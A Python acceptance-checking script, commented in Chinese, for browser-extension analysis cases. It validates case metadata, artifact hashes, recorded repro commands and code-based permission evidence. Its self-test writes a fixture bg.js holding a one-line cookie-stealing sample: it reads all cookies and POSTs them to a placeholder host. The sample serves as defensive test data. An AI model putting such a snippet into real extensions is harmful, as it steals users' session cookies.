#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""plugin-accept.py -- protocol-plugin 插件案例验收：字段/哈希/真跑/refs + 权限证据。

只做四件事：
1. **案例字段**：`Tool/cases/plugin*/case.json` 必填字段、domain、evidence_kind、
   outcome、target_type 与夹具标记自洽。
2. **哈希/产物**：`artifacts[].sha256` 复算；文本产物兼容 Git 的 CRLF 检出
   （LF 规范化后命中即算，二进制仍按原字节）。
3. **real + recorded**：`evidence_kind=real` 必须有 `repro.status=recorded`，
   `lessons[0]` 写清命令与 `rc=`，有 `run.json` 时至少一条 `rc=0`。
4. **权限证据**：`plugin-repro.json` 里 `permissions[].evidence[].file` 必须是
   代码文件（`.js/.ts/.py/...`）；`manifest.json`、`package.json`、`plugin.xml`
   等清单一律不算证据。这是 R2 审计血案的机检化。

`--self-test` 离线构造合规/违规案例并断言上述规则，rc=0；正常验收 rc=0，
有 FAIL 时 rc=2（最后一行 JSON `ok:false`，便于门禁抓取）。

用法：
    python plugin-accept.py --root . --json
    python plugin-accept.py --root . --case Tool/cases/plugin04 --json
    python plugin-accept.py --self-test

边界：只复算本域判据，不替代 `Tool/scripts/domain-gate.py`；不执行样本、
不联网、不写案例目录。
"""

from __future__ import annotations

import argparse
import glob
import hashlib
import json
import os
import re
import shlex
import sys
import tempfile

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass

def _repo_root(start):
    """仓库根：向上找含 Tool/cases 的目录。"""
    d = os.path.abspath(start)
    for _ in range(8):
        if os.path.isdir(os.path.join(d, "Tool", "cases")):
            return d
        nd = os.path.dirname(d)
        if nd == d:
            break
        d = nd
    return os.path.abspath(start)

HERE = os.path.dirname(os.path.abspath(__file__))
SKILL = os.path.dirname(HERE)
DEFAULT_ROOT = _repo_root(SKILL)
DOMAIN = "protocol-plugin"

CASE_FIELDS = ("id", "domain", "target_type", "evidence_kind", "protection",
               "authority", "goal_level", "outcome", "artifacts", "lessons",
               "refs", "updated")
FIXTURE_WORDS = ("夹具", "教学", "fixture", "示例")
GOOD_LEVELS = ("L1", "L2", "L3", "L4")
GOOD_OUTCOMES = ("success", "partial", "blocked")

# 权限证据只认代码文件；清单/配置/文档不算。
CODE_EXTS = {".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".py", ".java",
             ".kt", ".kts", ".cs", ".go", ".rs", ".php", ".rb", ".sh", ".ps1"}
NON_CODE_NAMES = {"manifest.json", "package.json", "plugin.xml", "info.plist",
                  "app-update.yml", "latest.yml"}
TEXT_EXTS = {".json", ".md", ".txt", ".yml", ".yaml", ".js", ".mjs", ".cjs",
             ".ts", ".py", ".xml", ".html", ".css", ".ps1", ".sh"}


def load(path):
    with open(path, encoding="utf-8-sig") as fh:
        return json.load(fh)


def sha256_bytes(raw):
    return hashlib.sha256(raw).hexdigest()


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def hash_matches(path, expected):
    """返回 (ok, mode, actual)。文本文件允许 LF 规范化后命中。"""
    with open(path, "rb") as fh:
        raw = fh.read()
    actual = sha256_bytes(raw)
    if actual == expected:
        return True, "raw", actual
    if os.path.splitext(path)[1].lower() in TEXT_EXTS:
        lf = raw.replace(b"\r\n", b"\n")
        if sha256_bytes(lf) == expected:
            return True, "lf-normalized", actual
        if sha256_bytes(lf.replace(b"\n", b"\r\n")) == expected:
            return True, "crlf-normalized", actual
    return False, "raw", actual


def rel(path, root):
    try:
        return os.path.relpath(path, root).replace(os.sep, "/")
    except ValueError:
        return path.replace(os.sep, "/")


def resolve_case(arg, root):
    cands = [arg] if os.path.isabs(arg) else [arg, os.path.join(root, arg)]
    for c in cands:
        if os.path.isdir(c):
            return os.path.abspath(c)
        if os.path.isfile(os.path.join(c, "case.json")):
            return os.path.abspath(c)
        if os.path.basename(c) == "case.json" and os.path.isfile(c):
            return os.path.abspath(os.path.dirname(c))
    return os.path.abspath(arg)


def _within(path, parent):
    try:
        return os.path.commonpath(
            (os.path.realpath(path), os.path.realpath(parent))) == os.path.realpath(parent)
    except (OSError, ValueError):
        return False


def _command_problems(command, cwd, root, label):
    """Check that a recorded command names an existing in-repo script."""
    problems = []
    if not isinstance(command, str) or not command.strip():
        return ["%s 不是非空命令" % label]
    if not isinstance(cwd, str) or not cwd.strip():
        return ["%s 缺 cwd" % label]
    base = cwd if os.path.isabs(cwd) else os.path.join(root, cwd)
    if not _within(base, root):
        return ["%s cwd 越出仓库根: %s" % (label, cwd)]
    if not os.path.isdir(base):
        return ["%s cwd 不存在: %s" % (label, cwd)]
    try:
        tokens = shlex.split(command, posix=True)
    except ValueError as exc:
        return ["%s 无法解析: %s" % (label, str(exc)[:80])]
    scripts = [t for t in tokens
               if os.path.splitext(t)[1].lower() in (".py", ".ps1", ".sh", ".js")]
    if not scripts:
        return ["%s 未引用脚本" % label]
    for token in scripts:
        if "plugin-targets/scripts/" in token.replace("\\", "/"):
            problems.append("%s 引用已归档路径 %s" % (label, token))
            continue
        full = token if os.path.isabs(token) else os.path.join(base, token)
        if not _within(full, root):
            problems.append("%s 脚本越出仓库根: %s" % (label, token))
        elif not os.path.isfile(full):
            problems.append("%s 脚本不存在: %s" % (label, token))
    return problems


def iter_case_dirs(root):
    base = os.path.join(root, "Tool", "cases")
    if not os.path.isdir(base):
        return []
    return [os.path.join(base, n) for n in sorted(os.listdir(base))
            if n.startswith("plugin") and os.path.isdir(os.path.join(base, n))]


def _permission_problems(case_dir, root, problems, facts):
    """校验 plugin-repro.json 的权限证据：只认代码文件命中。"""
    repro_jsons = sorted(set(glob.glob(
        os.path.join(case_dir, "**", "plugin-repro*.json"), recursive=True)))
    if not repro_jsons:
        facts["permission_evidence"] = "none"
        return
    checked = 0
    for rp in repro_jsons:
        try:
            data = load(rp)
        except Exception as exc:  # noqa: BLE001
            problems.append("权限证据 JSON 坏 %s: %s" % (os.path.basename(rp), str(exc)[:40]))
            continue
        perms = data.get("permissions")
        if not isinstance(perms, list):
            continue
        unpacked = data.get("unpacked") or ""
        bases = []
        if unpacked:
            if os.path.isabs(unpacked):
                bases.append(unpacked)
            else:
                bases.append(os.path.join(case_dir, unpacked))
                bases.append(os.path.join(root, unpacked))
        bases.append(os.path.join(case_dir, "artifacts", "repro", "unpack"))
        for perm in perms:
            if not isinstance(perm, dict):
                continue
            name = str(perm.get("name") or "?")
            status = str(perm.get("status") or "")
            evs = perm.get("evidence") or []
            checked += 1
            if status == "observed" and not evs:
                problems.append("权限 %s status=observed 但没有 evidence" % name)
            for ev in evs:
                f = str((ev or {}).get("file") or "").strip()
                base = os.path.basename(f).lower()
                ext = os.path.splitext(f)[1].lower()
                if not f:
                    problems.append("权限 %s 的 evidence.file 为空" % name)
                    continue
                if base in NON_CODE_NAMES or ext not in CODE_EXTS:
                    problems.append(
                        "权限 %s 的证据来自非代码文件 %s（manifest/清单不算）" % (name, f))
                    facts["manifest_evidence"] = True
                    continue
                tried = [os.path.join(b, f) for b in bases if os.path.isdir(b)]
                if tried and not any(os.path.isfile(x) for x in tried):
                    problems.append("权限 %s 的证据文件不存在 %s" % (name, f))
    facts["permission_evidence"] = "checked=%d" % checked


def check_case(case_dir, root):
    problems = []
    facts = {"dir": os.path.basename(case_dir.rstrip("/\\"))}
    cf = os.path.join(case_dir, "case.json")
    if not os.path.isfile(cf):
        return ["缺 case.json"], facts
    try:
        c = load(cf)
    except Exception as exc:  # noqa: BLE001
        return ["case.json 不是合法 JSON: %s" % str(exc)[:60]], facts

    for k in CASE_FIELDS:
        if k not in c:
            problems.append("缺字段 %s" % k)
    facts["id"] = c.get("id")
    facts["evidence_kind"] = c.get("evidence_kind")
    facts["outcome"] = c.get("outcome")

    if c.get("domain") != DOMAIN:
        problems.append("domain=%r 不是 %s" % (c.get("domain"), DOMAIN))
    kind = c.get("evidence_kind")
    if kind not in ("fixture", "real", "public", "self-built", "historical"):
        problems.append("evidence_kind=%r 非法" % kind)
    tt = str(c.get("target_type") or "")
    is_fix = any(w in tt for w in FIXTURE_WORDS)
    if kind == "fixture" and not is_fix:
        problems.append("fixture 但 target_type 未标夹具/教学")
    if kind in ("real", "public", "self-built") and is_fix:
        problems.append("real 却把 target_type 标成夹具")
    if c.get("outcome") == "planned":
        problems.append("outcome=planned 不许入库")
    if c.get("outcome") not in GOOD_OUTCOMES:
        problems.append("outcome=%r 不在 %s" % (c.get("outcome"), GOOD_OUTCOMES))
    if c.get("goal_level") not in GOOD_LEVELS:
        problems.append("goal_level=%r 非法" % c.get("goal_level"))

    arts = c.get("artifacts") or []
    if not arts:
        problems.append("artifacts 为空")
    modes = []
    for art in arts:
        ap = str((art or {}).get("path") or "")
        want = str((art or {}).get("sha256") or "").lower()
        full = os.path.join(case_dir, ap)
        if not ap or not os.path.isfile(full):
            problems.append("幻影产物 %s" % (ap[:40] or "<空>"))
            continue
        if len(want) != 64:
            problems.append("%s 缺 sha256" % ap[:40])
            continue
        ok, mode, actual = hash_matches(full, want)
        modes.append(mode)
        if not ok:
            problems.append("%s sha256 不符（实算 %s）" % (ap[:40], actual[:12]))
    facts["hash_modes"] = sorted(set(modes))

    for r in c.get("refs") or []:
        if isinstance(r, str) and "://" not in r:
            if not os.path.isfile(os.path.join(root, r)):
                problems.append("refs 幻影 %s" % r[:60])

    lessons = c.get("lessons") or []
    if not lessons:
        problems.append("lessons 为空")
    else:
        head = str(lessons[0])
        if "rc=" not in head:
            problems.append("lessons[0] 未写 rc（须写清命令与退出码）")
        if not re.search(r"(python|npx|node|strings|xxd|sha256sum|signtool|"
                         r"unzip|7z|file|grep|jar|jadx|ilspycmd|r2|frida|"
                         r"[\w./-]+\.(?:py|ps1|sh|js))\b",
                         head, re.I):
            problems.append("lessons[0] 未写命令")

    repro = c.get("repro") or {}
    recorded = str(repro.get("status") or "") == "recorded"
    facts["recorded"] = recorded
    if kind in ("real", "public", "self-built") and not recorded:
        problems.append("real 案例 repro.status 不是 recorded（real+recorded 缺一）")
    if recorded:
        command = repro.get("command")
        cwd = repro.get("cwd")
        rc = repro.get("rc")
        problems.extend(_command_problems(command, cwd, root, "repro.command"))
        if not isinstance(rc, int) or isinstance(rc, bool) or rc != 0:
            problems.append("repro.rc 必须是整数 0")
        facts["repro_command"] = command
        facts["repro_cwd"] = cwd

    run_json = os.path.join(case_dir, "artifacts", "run.json")
    if os.path.isfile(run_json):
        try:
            run = load(run_json)
            runs = run.get("runs") if isinstance(run, dict) else None
            if not runs:
                problems.append("artifacts/run.json 无 runs[]")
            else:
                facts["runs"] = len(runs)
                run_cwd = (run.get("cwd") if isinstance(run, dict) else None) or "."
                if not any(isinstance(r, dict) and r.get("rc") == 0 for r in runs):
                    problems.append("artifacts/run.json 没有 rc=0 的运行")
                for index, row in enumerate(runs):
                    if not isinstance(row, dict):
                        problems.append("artifacts/run.json runs[%d] 不是对象" % index)
                        continue
                    if not isinstance(row.get("rc"), int) or isinstance(row.get("rc"), bool):
                        problems.append("artifacts/run.json runs[%d].rc 不是整数" % index)
                    problems.extend(_command_problems(
                        row.get("cmd"), run_cwd, root,
                        "artifacts/run.json runs[%d].cmd" % index))
        except Exception as exc:  # noqa: BLE001
            problems.append("artifacts/run.json 坏: %s" % str(exc)[:40])

    _permission_problems(case_dir, root, problems, facts)
    return problems, facts


def run_cases(dirs, root):
    results = []
    problems = []
    for d in dirs:
        probs, facts = check_case(d, root)
        results.append({"case": facts.get("dir"), "ok": not probs,
                        "problems": probs, "facts": facts})
        problems += ["%s: %s" % (facts.get("dir"), p) for p in probs]
    return results, problems


def _write_case(case_dir, case, run_json=True):
    os.makedirs(os.path.join(case_dir, "artifacts", "repro", "unpack"), exist_ok=True)
    bg = os.path.join(case_dir, "artifacts", "repro", "unpack", "bg.js")
    with open(bg, "w", encoding="utf-8", newline="\n") as fh:
        fh.write("chrome.cookies.getAll({}, function (c) { fetch('https://x.invalid', "
                 "{method: 'POST', body: JSON.stringify(c)}); });\n")
    rj = os.path.join(case_dir, "artifacts", "repro", "plugin-repro.json")
    with open(rj, "w", encoding="utf-8", newline="\n") as fh:
        json.dump({
            "ok": True, "container": "zip", "permissions": [{
                "name": "cookies", "risk": "high", "status": "observed",
                "evidence": [{"file": "bg.js", "line": 1,
                              "snippet": "chrome.cookies.getAll(...)"}]}],
            "unpacked": "artifacts/repro/unpack",
        }, fh, ensure_ascii=False)
    if run_json:
        rp = os.path.join(case_dir, "artifacts", "run.json")
        with open(rp, "w", encoding="utf-8", newline="\n") as fh:
            json.dump({"case": case["id"], "cwd": ".", "runs": [{
                "cmd": "python Tool/skill/protocol-plugin/scripts/plugin-repro.py --self-test",
                "rc": 0,
            }]},
                      fh, ensure_ascii=False)
        case["artifacts"] = [
            {"path": "artifacts/repro/plugin-repro.json", "sha256": sha256_file(rj)},
            {"path": "artifacts/run.json", "sha256": sha256_file(rp)},
        ]
    with open(os.path.join(case_dir, "case.json"), "w", encoding="utf-8", newline="\n") as fh:
        json.dump(case, fh, ensure_ascii=False, indent=2)


def self_test(_root):
    checks = []
    tmp = tempfile.mkdtemp(prefix="plugin-accept-")
    root = os.path.join(tmp, "repo")
    os.makedirs(root, exist_ok=True)
    case_dir = os.path.join(tmp, "plugin99")
    good = {
        "id": "plugin99", "domain": DOMAIN,
        "target_type": "本地 ZIP 扩展夹具（教学样本）", "evidence_kind": "fixture",
        "protection": [], "authority": "local", "goal_level": "L2",
        "outcome": "partial", "artifacts": [],
        "lessons": ["跑的是 python x.py，rc=0；权限证据落在 bg.js。"],
        "refs": ["Tool/skill/protocol-plugin/SKILL.md"],
        "updated": "2026-10-21",
        "repro": {
            "status": "recorded", "evidence": "见 lessons 首条",
            "command": "python Tool/skill/protocol-plugin/scripts/plugin-repro.py --self-test",
            "cwd": ".", "rc": 0,
        },
    }
    fake_script = os.path.join(
        root, "Tool", "skill", "protocol-plugin", "scripts", "plugin-repro.py")
    os.makedirs(os.path.dirname(fake_script), exist_ok=True)
    with open(fake_script, "w", encoding="utf-8") as fh:
        fh.write("# self-test fixture\n")
    fake_ref = os.path.join(root, "Tool", "skill", "protocol-plugin", "SKILL.md")
    with open(fake_ref, "w", encoding="utf-8") as fh:
        fh.write("# self-test fixture\n")
    _write_case(case_dir, good)
    probs, facts = check_case(case_dir, root)
    checks.append(("合规案例 0 problem", not probs))
    checks.append(("权限证据来自代码文件", facts.get("permission_evidence") == "checked=1"))
    checks.append(("repro/run 脚本真实存在", not any("脚本不存在" in p for p in probs)))

    # 错哈希
    bad = load(os.path.join(case_dir, "case.json"))
    bad["artifacts"][0]["sha256"] = "0" * 64
    _write_case(case_dir, bad, run_json=False)
    probs, _ = check_case(case_dir, root)
    checks.append(("错哈希被发现", any("sha256 不符" in p for p in probs)))

    # real 但没有 recorded
    bad = load(os.path.join(case_dir, "case.json"))
    bad["evidence_kind"] = "real"
    bad["target_type"] = "真实扩展样本"
    bad["repro"] = {"status": "not-recorded"}
    _write_case(case_dir, bad, run_json=False)
    probs, _ = check_case(case_dir, root)
    checks.append(("real 未 recorded 被发现",
                   any("real+recorded" in p for p in probs)))

    # 权限证据来自 manifest.json
    bad = load(os.path.join(case_dir, "case.json"))
    bad["evidence_kind"] = "fixture"
    bad["target_type"] = "本地 ZIP 扩展夹具（教学样本）"
    bad["repro"] = {"status": "recorded"}
    _write_case(case_dir, bad, run_json=False)
    rj = os.path.join(case_dir, "artifacts", "repro", "plugin-repro.json")
    data = load(rj)
    data["permissions"][0]["evidence"][0]["file"] = "manifest.json"
    with open(rj, "w", encoding="utf-8", newline="\n") as fh:
        json.dump(data, fh, ensure_ascii=False)
    probs, facts = check_case(case_dir, root)
    checks.append(("manifest.json 证据被发现",
                   any("非代码文件" in p for p in probs) and facts.get("manifest_evidence")))

    bad = load(os.path.join(case_dir, "case.json"))
    bad["repro"]["command"] = (
        "python Tool/skill/plugin-targets/scripts/no-such-plugin-tool.py --self-test")
    bad["repro"]["cwd"] = "."
    bad["repro"]["rc"] = 0
    _write_case(case_dir, bad, run_json=False)
    probs, _ = check_case(case_dir, root)
    checks.append(("repro 已归档/幻影脚本被发现",
                   any("已归档路径" in p or "脚本不存在" in p for p in probs)))

    # 幻影 refs
    bad = load(os.path.join(case_dir, "case.json"))
    bad["refs"] = ["Tool/skill/protocol-plugin/references/no-such-file.md"]
    _write_case(case_dir, bad, run_json=False)
    probs, _ = check_case(case_dir, root)
    checks.append(("幻影 refs 被发现", any("refs 幻影" in p for p in probs)))

    failed = [n for n, ok in checks if not ok]
    print(json.dumps({"ok": not failed, "self_test": True, "checks": len(checks),
                      "passed": len(checks) - len(failed), "failed": failed},
                     ensure_ascii=False))
    return 0 if not failed else 1


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="protocol-plugin 插件案例验收：字段/sha256/real+recorded/refs + 权限代码证据",
        epilog="退出码：0 全过；2 有 FAIL（JSON ok:false）。")
    ap.add_argument("--root", default=DEFAULT_ROOT,
                    help="仓库根（默认按脚本位置推导）")
    ap.add_argument("--case", action="append", default=[],
                    help="案例目录或 case.json（可重复）；缺省扫 Tool/cases/plugin*")
    ap.add_argument("--json", action="store_true", help="输出 JSON")
    ap.add_argument("--self-test", action="store_true",
                    help="离线自检：合规/错哈希/real 未 recorded/manifest 证据/幻影 refs")
    args = ap.parse_args(argv)

    root = os.path.abspath(args.root)
    if args.self_test:
        return self_test(root)

    out = {"ok": True, "script": "plugin-accept.py", "domain": DOMAIN,
           "root": root, "case_count": 0, "cases": [], "problems": []}
    try:
        dirs = [resolve_case(p, root) for p in args.case] or iter_case_dirs(root)
        if not dirs:
            raise RuntimeError("没有找到任何 plugin* 案例目录")
        results, problems = run_cases(dirs, root)
        out["cases"] = results
        out["case_count"] = len(results)
        out["problems"] = problems
        out["ok"] = not problems
    except Exception as exc:  # noqa: BLE001
        print(json.dumps({"ok": False, "blocked_at": "accept",
                          "reason": "%s: %s" % (type(exc).__name__, str(exc)[:160])},
                         ensure_ascii=False))
        return 2

    if args.json:
        print(json.dumps(out, ensure_ascii=False, indent=2))
    else:
        for r in out["cases"]:
            print("[%s] %-12s %s" % ("PASS" if r["ok"] else "FAIL",
                                    r["case"], "" if r["ok"] else "；".join(r["problems"])))
        print("\n结果: %s%s" % ("PASS" if out["ok"] else "FAIL",
                              "" if out["ok"] else "  ← " + "；".join(out["problems"][:5])))
    return 0 if out["ok"] else 2


if __name__ == "__main__":
    sys.exit(main())
